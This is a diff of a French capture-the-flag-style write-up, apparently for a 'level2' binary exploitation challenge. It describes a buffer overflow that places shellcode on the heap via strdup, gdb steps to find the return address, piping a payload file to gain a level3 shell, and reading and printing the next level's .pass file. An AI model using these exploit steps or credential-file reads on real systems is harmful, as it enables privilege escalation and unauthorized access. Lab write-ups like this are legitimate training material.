@@ -3,7 +3,7 @@
 
 >./level2
     >Test
-    Test
+        Test
 
 Quand on rentre quoique ce soit, ca le renvoie
 
@@ -77,23 +77,22 @@ buffer est à (ebp-0x4c) donc 76 octets de ebp, on a 21 octets de shellcode on r
 
 on veut l'adresse de la heap pour l'adresse de retour car elle ne commence pas par 0xb et donc on peut passer la verif. pour se faire
 dans gdb
+
 >break *0x08048535 (adresse du call strdup)
 >run
-Starting program: /home/user/level2/level2 
+    Starting program: /home/user/level2/level2 
 
 
-
-Breakpoint 1, 0x08048535 in p ()
+    Breakpoint 1, 0x08048535 in p ()
 >step
 >p/x $eax
-$1 = 0x804a008
+    $1 = 0x804a008
 
 
+>cat /tmp/payload - | ./level2 ("-" laisse l'entrée standard ouverte et permet d'utiliser le shell lancé par execve)
 
-> cat /tmp/payload - | ./level2 ("-" laisse l'entrée standard ouverte et permet d'utiliser le shell lancé par execve)
-
-> id
-uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
+>id
+    uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
 
 >cat /home/user/level3/.pass
-492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+    492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
